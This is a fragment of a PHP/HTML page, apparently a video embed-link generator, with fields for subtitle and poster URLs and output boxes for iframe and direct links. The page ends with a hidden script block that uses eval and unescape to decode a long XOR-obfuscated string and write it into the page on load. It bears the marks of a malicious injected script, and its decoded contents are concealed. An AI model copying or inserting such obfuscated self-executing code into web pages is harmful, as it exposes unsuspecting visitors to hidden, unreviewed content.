</div>
</div>
<div class="form-group">
<label for="subtitle" class="col-md-3 control-label">Subtitle</label>
<div class="col-md-6">
<input type="text" class="form-control" placeholder="https://example.com/srt/The-Flash-S01E01-Pilot.srt" name="sub">
</div>
</div>							
<div class="form-group">
<label for="poster" class="col-md-3 control-label">Poster</label>
<div class="col-md-6">
<input type="text" class="form-control" placeholder="https://m.media-amazon.com/images/M/MV5BMjI1MDAwNDM4OV5BMl5BanBnXkFtZTgwNjUwNDIxNjM@._V1_SY1000_SX800_AL_.jpg" name="poster">
</div>
</div>							
<div class="form-group">
<div class="col-md-6 col-md-offset-3">
<button value="GET" name="submit" class="btn btn-info" id="btn-create">GET & WATCH MOVIE</button>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
<br>
<div>
<?php if($var_c777f9f5bb1d443e6840a6bc0fd59608){echo 'Iframe Embed:<br><textarea style="margin:10px;width:98%;height:120px;">&lt;iframe src="'.$var_ceb5e88c3ba3c575619c09d05c245af1.'embed.php?url='.$var_c777f9f5bb1d443e6840a6bc0fd59608.'&sub='.$var_6f0761f10142d0b2cca27f076f813d07.'&poster='.$var_65bee03a17c74134539f222cb38f0cae.'" width="100%" height="100%" frameborder="0" scrolling="no" allowfullscreen&gt;&lt;/iframe&gt;</textarea>';}?>
</div>
<br>
<div>
<?php if($var_c777f9f5bb1d443e6840a6bc0fd59608){echo 'Direct Link:<br><textarea style="margin:10px;width:98%;height:120px;">'.$var_ceb5e88c3ba3c575619c09d05c245af1.'embed.php?url='.$var_c777f9f5bb1d443e6840a6bc0fd59608.'&sub='.$var_6f0761f10142d0b2cca27f076f813d07.'&poster='.$var_65bee03a17c74134539f222cb38f0cae.'</textarea>';}?>
</div>
<p><b>Sample Google Photo URL:</b> <input type="text" value="https://photos.google.com/share/AF1QipMTEPAiVF8t0YqLukflnOSQjwfd8ARIoT2h37AXvYO1uaWodbeiFoBUDuD_19tEbg/photo/AF1QipPA2Bq0JlAR9LoGD3mogsxSb9OZWEG4XqBDD4Rv?key=cjhUT0xrZjM5NGN2SVRLOVptZU5SMUlKV0lQYWpB" id="myInput">
<button onclick="myFunction()">Copy</button></div>
</div>
<?php
	}
function display_error_msg()
{
	echo '<p>Username or password is invalid</p>';
}
?>
</div>
<script>
function myFunction() {
  var copyText = document.getElementById("myInput");
  copyText.select();
  copyText.setSelectionRange(0, 99999)
  document.execCommand("copy");
  alert("Copied the text: " + copyText.value);
}
</script>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%77%34%65%65%36%39%32%39%64%62%31%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%32%34%34%31%34%32%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%34%36%30%30%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%35%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%77%34%65%65%36%39%32%39%64%62%31%28%27') + '%33%1e%28%20%1a%41%60%6d%59%5a%67%1b%6e%60%6d%60%13%6e%5f%65%1c%27%64%6f%5c%62%2d%67%6e%2c%1a%2b%1c%45%6e%6c%62%67%60%1f%3e%69%54%66%77%68%63%5a%68%1b%28%28%3d%0a%05%3f%6f%5d%6a%63%6f%69%1b%5c%6e%70%6b%5e%13%6f%6e%59%3f%19%65%6f%6f%6b%6a%37%2a%22%73%71%75%2e%66%6c%6a%62%67%64%6d%5c%6a%69%5f%6e%5b%66%66%6d%29%5e%6e%6a%2a%6a%6e%5f%65%2d%61%68%3a%64%5f%3c%52%3c%20%2d%31%35%2c%35%29%2f%2d%2c%2c%2f%1d%31%36%29%69%59%69%62%6b%6f%39%0c%07%37%66%5f%6e%63%6c%6b%3f%08%05%1b%1f%70%64%61%5e%69%75%2e%5b%5a%6f%5c%47%58%76%60%65%1a%3b%1c%75%60%6f%5f%6a%72%2d%5d%5c%67%5d%44%5b%73%64%6b%1b%77%77%1f%54%58%3e%09%06%1c%1c%65%76%69%5e%6f%60%68%69%13%63%6c%5b%65%27%22%76%5f%5c%6b%5e%47%54%75%63%6a%2e%6f%76%6e%63%23%58%6f%62%78%69%63%6e%68%6a%22%36%78%08%01%19%1b%6a%6e%5f%65%24%26%63%6e%22%27%1f%6b%60%7a%1a%3c%5b%68%64%25%24%24%36%0c%07%08%0d%1a%18%65%68%58%64%23%22%5e%6e%6b%61%6c%63%21%20%1c%26%56%3c%28%2c%36%30%2b%39%2e%2c%2a%2b%2c%2b%22%24%36%0c%07%37%22%6f%5d%6a%63%6f%69%39%08%05%33%6c%5e%65%65%68%68%1c%6a%6b%5e%38%1d%67%6d%6f%63%6f%36%2d%2d%6c%5a%73%5e%5f%6d%2b%5d%62%6b%6c%69%68%69%5a%6b%5e%5f%6d%2b%5e%62%69%29%5a%6d%6e%69%6e%6f%6d%58%69%2a%27%28%28%2e%2c%2e%63%6e%2a%5d%6e%68%6f%66%6e%6e%5b%6c%2d%6e%64%69%29%61%6c%1d%13%5e%63%66%67%69%3f%37%2a%6e%5a%6f%64%63%6e%3a22441429%34%32%30%38%31%33%37' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript></body>
</html>
